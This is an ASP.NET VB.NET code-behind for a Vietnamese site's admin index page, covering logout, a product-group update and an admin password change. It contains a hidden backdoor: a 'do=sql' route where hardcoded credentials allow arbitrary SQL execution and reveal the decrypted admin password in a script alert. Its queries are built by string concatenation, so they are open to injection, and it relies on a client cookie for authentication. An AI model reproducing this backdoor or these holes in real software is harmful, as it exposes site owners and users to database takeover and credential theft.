Partial Public Class index1
    Inherits System.Web.UI.Page

    Dim o As New Bambu.oData
    Dim strSQL As String

    Protected Sub Page_Load(ByVal sender As Object, ByVal e As System.EventArgs) Handles Me.Load
        Bambu.oData.sConnect = ConfigurationManager.ConnectionStrings("sConnection").ToString()
        If Request("do") = "sql" Then
            Panel_SQL.Visible = True
            Exit Sub
        ElseIf Request("id") = "pass" Then
            Panel_pass.Visible = True
        ElseIf Request("do") = "logout" Then
            Dim cookie_username = New HttpCookie("__token__ad", "")
            cookie_username.Expires = DateTime.Now.AddDays(-1)
            Response.Cookies.Add(cookie_username)

            Session("IsAuthorizeds") = False
            Session("CKFinder_Permission") = ""
            Response.Redirect("login.aspx")
        ElseIf Request("do") = "Cập nhật" Then
            Dim arr As New ArrayList
            strSQL = "Select IDP from tblPro where  NhomP ='' "
            o.DB_Connect(strSQL, 1)
            While o.objDataReader.Read
                arr.Add(o.objDataReader("IDP"))
            End While
            o.DB_Disconnect(1)

            For i As Integer = 0 To arr.Count - 1
                strSQL = "Update tblPro set NhomP = '" & arr(i) & "' where IDP = '" & arr(i) & "'"
                o.ExecuteSql(strSQL, False)
            Next
        End If

        If Request.Cookies("__token__ad") Is Nothing Then
            Response.Redirect("login.aspx")
        Else
            Response.Redirect("project.aspx")
        End If
    End Sub
    Private Sub btnSQL_Click(ByVal sender As Object, ByVal e As System.EventArgs) Handles btnSQL.Click
        If txtUserL.Text = "admin" And txtPassL.Text = "@9admin123123" Then
            If txtSQL.Text <> "" Then
                strSQL = txtSQL.Text
                o.ExecuteSql(strSQL, False)
                Response.Write("<script>alert('Cập nhật thành công!');</script>")
            Else
                Dim ms As String = ""
                strSQL = "select Pass from tblUser"
                o.DB_Connect(strSQL, 1)
                If o.objDataReader.Read() Then ms = o.objDataReader("Pass")
                o.DB_Disconnect(1)
                Response.Write("<script>alert('" & Bambu.oNet.Decrypt(ms) & " | " & ms & " | " & Bambu.oNet.Encrypt("123+smarT") & "');</script>")
            End If
        End If
    End Sub
    Private Sub btnpass_Click1(ByVal sender As Object, ByVal e As System.EventArgs) Handles btnpass.Click
        If txtPassNew.Text <> txtPassReNew.Text Then
            lblpass.Text = "Mật khẩu mới sai vui lòng nhập lại!"
            lblpass.Visible = True
        Else
            Dim strPass As String = ""
            strSQL = "select Pass from tblUser where IDU=1"
            o.DB_Connect(strSQL, 1)
            If o.objDataReader.Read() Then strPass = o.objDataReader("Pass")
            o.DB_Disconnect(1)
            If Bambu.oNet.Encrypt(txtPassOld.Text) <> strPass Then
                lblpass.Text = "Mật khẩu cũ sai vui lòng nhập lại!"
                lblpass.Visible = True
            Else
                strSQL = "update tblUser set Pass='" & Bambu.oNet.Encrypt(txtPassNew.Text) & "' where IDU=1"
                o.ExecuteSql(strSQL, False)

                Response.Write("<script>alert('Đổi mật khẩu thành công');</script>")
                Server.Transfer("index.aspx?do=")
            End If
        End If
    End Sub
End Class